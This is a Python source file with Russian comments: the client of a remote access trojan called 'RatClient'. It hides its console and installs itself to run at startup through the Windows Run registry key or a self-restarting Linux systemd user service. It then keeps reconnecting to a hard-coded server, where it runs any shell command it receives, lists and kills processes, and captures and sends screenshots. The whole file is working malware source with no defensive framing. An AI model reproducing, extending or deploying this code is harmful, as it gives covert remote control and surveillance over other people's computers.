import socket
import subprocess
import os
import sys
import time

SERVER_IP = "192.168.100.3"  # Жёстко заданный IP
SERVER_PORT = 5000
BUFFER_SIZE = 4096

def execute_command(command):
    try:
        output = subprocess.getoutput(command)
        return output
    except Exception as e:
        return f"Ошибка выполнения команды: {e}"

def is_windows():
    return os.name == 'nt'

def add_to_autostart_windows():
    try:
        import winreg
    except ImportError:
        return False, "Модуль winreg не доступен"

    try:
        exe_path = sys.executable
        script_path = os.path.abspath(__file__)
        # Команда запуска: pythonw.exe client.py (pythonw убирает окно консоли)
        if exe_path.lower().endswith("python.exe"):
            pythonw_path = exe_path[:-4] + "w.exe"
            if os.path.exists(pythonw_path):
                exe_path = pythonw_path

        cmd = f'"{exe_path}" "{script_path}"'

        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RatClient", 0, winreg.REG_SZ, cmd)
        winreg.CloseKey(key)
        return True, "Добавлено в автозагрузку Windows"
    except Exception as e:
        return False, f"Ошибка при добавлении в автозагрузку Windows: {e}"

def is_in_autostart_windows():
    try:
        import winreg
    except ImportError:
        return False

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_READ)
        i = 0
        while True:
            name, value, _ = winreg.EnumValue(key, i)
            if name == "RatClient":
                return True
            i += 1
    except OSError:
        return False

def add_to_autostart_linux():
    """
    Добавляем systemd user-сервис:
    Создаем файл ~/.config/systemd/user/ratclient.service
    и запускаем его.
    """
    home = os.path.expanduser("~")
    systemd_dir = os.path.join(home, ".config", "systemd", "user")
    if not os.path.isdir(systemd_dir):
        os.makedirs(systemd_dir, exist_ok=True)

    service_path = os.path.join(systemd_dir, "ratclient.service")

    python_path = sys.executable
    script_path = os.path.abspath(__file__)

    service_content = f"""[Unit]
Description=Rat Client Service
After=network.target

[Service]
ExecStart={python_path} {script_path}
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
"""

    if os.path.exists(service_path):
        # Проверим совпадает ли содержимое – чтобы не перезаписывать постоянно
        with open(service_path, "r", encoding="utf-8") as f:
            existing = f.read()
        if existing == service_content:
            return True, f"Сервис systemd уже установлен: {service_path}"

    try:
        with open(service_path, "w", encoding="utf-8") as f:
            f.write(service_content)
    except Exception as e:
        return False, f"Ошибка записи systemd unit файла: {e}"

    # Активируем сервис
    try:
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
        subprocess.run(["systemctl", "--user", "enable", "ratclient.service"], check=True)
        subprocess.run(["systemctl", "--user", "start", "ratclient.service"], check=True)
    except Exception as e:
        return False, f"Ошибка при запуске systemd сервиса: {e}"

    return True, f"Сервис systemd установлен и запущен: {service_path}"

def is_in_autostart_linux():
    home = os.path.expanduser("~")
    service_path = os.path.join(home, ".config", "systemd", "user", "ratclient.service")
    return os.path.exists(service_path)

def add_self_to_autostart():
    if is_windows():
        if not is_in_autostart_windows():
            success, msg = add_to_autostart_windows()
            print(msg)
        else:
            print("Уже добавлен в автозагрузку Windows")
    else:
        if not is_in_autostart_linux():
            success, msg = add_to_autostart_linux()
            print(msg)
        else:
            print("Уже добавлен в systemd автозагрузку")

def main():
    # Добавляем автозапуск при старте
    try:
        add_self_to_autostart()
    except Exception as e:
        print(f"Ошибка добавления в автозапуск: {e}")

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((SERVER_IP, SERVER_PORT))
        except Exception:
            # если не получилось подключиться, ждем и повторяем
            time.sleep(5)
            continue

        try:
            while True:
                data = s.recv(BUFFER_SIZE).decode(errors='ignore')
                if not data:
                    break
                if data == "exit":
                    break
                if data.startswith("cmd:"):
                    cmd = data[4:]
                    output = execute_command(cmd)
                    s.send(output.encode(errors='ignore'))
                elif data == "process_list":
                    if os.name == 'nt':
                        procs = subprocess.getoutput('tasklist')
                    else:
                        procs = subprocess.getoutput('ps aux')
                    s.send(procs.encode(errors='ignore'))
                elif data.startswith("kill:"):
                    pid = data[5:]
                    try:
                        if os.name == 'nt':
                            subprocess.check_output(f'taskkill /PID {pid} /F', shell=True)
                        else:
                            subprocess.check_output(f'kill -9 {pid}', shell=True)
                        s.send(f"Процесс {pid} завершён.".encode(errors='ignore'))
                    except Exception as e:
                        s.send(f"Ошибка: {e}".encode(errors='ignore'))
                elif data == "screenshot":
                    try:
                        import pyautogui
                        screenshot = pyautogui.screenshot()
                        screenshot.save("screen.jpg")
                        with open("screen.jpg", "rb") as f:
                            while True:
                                chunk = f.read(BUFFER_SIZE)
                                if not chunk:
                                    break
                                s.sendall(chunk)
                        os.remove("screen.jpg")
                    except Exception as e:
                        s.send(f"Ошибка снятия скриншота: {e}".encode(errors='ignore'))
                else:
                    s.send("Неизвестная команда".encode(errors='ignore'))
        except:
            pass
        finally:
            s.close()
        # при разрыве ждем и переподключаемся заново
        time.sleep(5)

if __name__ == "__main__":
    main()
